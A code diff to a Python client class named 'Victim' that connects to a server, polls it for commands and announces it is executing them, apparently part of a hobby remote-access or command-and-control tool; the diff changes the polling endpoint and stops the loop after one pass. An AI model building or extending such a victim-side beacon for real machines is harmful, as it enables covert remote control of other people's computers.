@@ -45,7 +45,7 @@ class Victim:
 
     # Ask for a command to execute
     def askForCommand(self):
-        return self.__session.request('GET', self.__serverUrl + '/victim/victim.php', params={'askingForCommand': 1}).text
+        return self.__session.request('GET', self.__serverUrl + '/victim/askForCommand.php')
 
 
     def disconnectFromServer(self):
@@ -72,24 +72,21 @@ def main():
     print('Requesting login...')
     printResponse(victim.connectToServer(baseUrl))
 
+    running = True
     try:
-        while True:
+        #while True:
+        while running:
             # Ask for command to server
             print('Asking for command...')
-            data['cmd'] = victim.askForCommand()
+            data['cmd'] = victim.askForCommand().text
             print('Command received: ', data['cmd'])
 
             # Execute command
             print('Executing...')
 
-            time.sleep(1)
 
-
-            # Send command output to server
-            # Send command
-            #response = requests.request('POST', url, data=data, cookies={'__test': 'f1857067ff8936b46d925e9609d9c72c'})
-            #response = s.request('POST', url, data=data, cookies={'__test': 'f1857067ff8936b46d925e9609d9c72c'})
-
+            #time.sleep(1)
+            running = False
     # If hit Ctrl+c
     except KeyboardInterrupt:
         raise SystemExit
@@ -97,8 +94,6 @@ def main():
         printResponse(victim.disconnectFromServer())
 
     #printResponse(requests.request('GET', baseUrl + '/modules/sessionManager.php'))
-
-
     #print(s.cookies.get_dict())
     #print(response.content)
     #print(response.text)
